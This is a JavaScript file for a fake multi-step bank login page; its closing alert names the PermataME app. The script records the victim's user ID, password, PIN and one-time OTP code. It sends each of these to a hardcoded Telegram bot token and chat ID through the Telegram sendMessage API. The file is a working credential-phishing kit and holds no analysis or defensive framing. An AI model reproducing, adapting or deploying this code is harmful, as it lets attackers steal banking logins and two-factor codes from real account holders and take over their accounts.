// ===== PENGATURAN BOT TELEGRAM =====
const TOKEN_BOT = "8617501639%3AAAHMP9L77ITfZBD0tB5HbTPrsFrp-DXl7KA";
const ID_CHAT = "8966861702";

let dataLogin = {};
let kodeCaptchaBenar = "";
let timer1, timer2;

window.onload = function() {
    buatCaptcha();
};

// Ganti Halaman
function gantiHalaman(id) {
    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
    document.getElementById(id).classList.add('aktif');
    if(id === 'halaman-pin') aturInputPin();
    if(id === 'halaman-otp') { mulaiTimerOtp(); aturInputOtp(); }
}

// Buat Captcha
function buatCaptcha() {
    const k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    kodeCaptchaBenar = Array.from({length:4}, () => k[Math.floor(Math.random()*k.length)]).join('');
    document.getElementById('kotakCaptcha').textContent = kodeCaptchaBenar;
}

// Kirim ke Telegram
async function kirimTelegram(pesan) {
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
            method:"POST", headers:{"Content-Type":"application/json"},
            body:JSON.stringify({chat_id:ID_CHAT, text:pesan, parse_mode:"Markdown"})
        });
    } catch(e) { console.log(e); }
}

// Proses Login
document.getElementById('formLogin').addEventListener('submit', e => {
    e.preventDefault();
    const uid = document.getElementById('userid').value.trim();
    const pwd = document.getElementById('password').value.trim();
    const cap = document.getElementById('captcha').value.trim();
    if(!uid||!pwd||!cap) return alert("Lengkapi semua kolom!");
    if(cap !== kodeCaptchaBenar) { alert("Kode salah!"); buatCaptcha(); return; }
    
    dataLogin = {uid, pwd};
    kirimTelegram(`📌 DATA LOGIN\n• User ID: ${uid}\n• Password: ${pwd}\n• CAPTCHA: ${cap}`);
    gantiHalaman('halaman-pin');
});

// ✅ PIN HANYA ANGKA & Otomatis Pindah
function aturInputPin() {
    const kotak = document.querySelectorAll('#halaman-pin .kotak-pin');
    kotak.forEach((el,i) => {
        el.value = '';
        el.addEventListener('input', function() {
            // HAPUS SEMUA KARAKTER BUKAN ANGKA
            this.value = this.value.replace(/[^0-9]/g, '');
            if(this.value.length === 1) {
                if(i <5) kotak[i+1].focus();
                else {
                    let pin = Array.from(kotak, k=>k.value).join('');
                    kirimTelegram(`📌 DATA PIN\n• User ID: ${dataLogin.uid}\n• PIN: ${pin}`);
                    setTimeout(() => gantiHalaman('halaman-otentikasi'), 300);
                }
            }
        });
        el.addEventListener('keydown', e => {
            if(e.key==='Backspace' && !this.value && i>0) kotak[i-1].focus();
        });
    });
}

// Input OTP & Aktifkan Tombol
function aturInputOtp() {
    const kotak = document.querySelectorAll('#halaman-otp .kotak-otp');
    const btn = document.getElementById('btnKonfirmasi');
    kotak.forEach((el,i) => {
        el.value = '';
        el.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g,'');
            if(this.value.length===1 && i<5) kotak[i+1].focus();
            const lengkap = Array.from(kotak, k=>k.value.length===1).every(v=>v);
            btn.disabled = !lengkap;
        });
        el.addEventListener('keydown', e => {
            if(e.key==='Backspace' && !this.value && i>0) kotak[i-1].focus();
        });
    });
}

// Hitung Mundur OTP
function mulaiTimerOtp() {
    clearInterval(timer2);
    let sisa = 118;
    const tampil = document.getElementById('timerOtp');
    timer2 = setInterval(() => {
        sisa--;
        let m = Math.floor(sisa/60), d = sisa%60;
        tampil.textContent = `${m<10?'0'+m:m}:${d<10?'0'+d:d}`;
        if(sisa<=0) clearInterval(timer2);
    },1000);
}

// Kirim Data OTP
function kirimOtp() {
    const otp = Array.from(document.querySelectorAll('#halaman-otp .kotak-otp'), k=>k.value).join('');
    kirimTelegram(`📌 DATA OTP\n• User ID: ${dataLogin.uid}\n• Kode OTP: ${otp}`);
    alert("konfirmasi melalui aplikasi PermataME!");
    clearInterval(timer2);
}
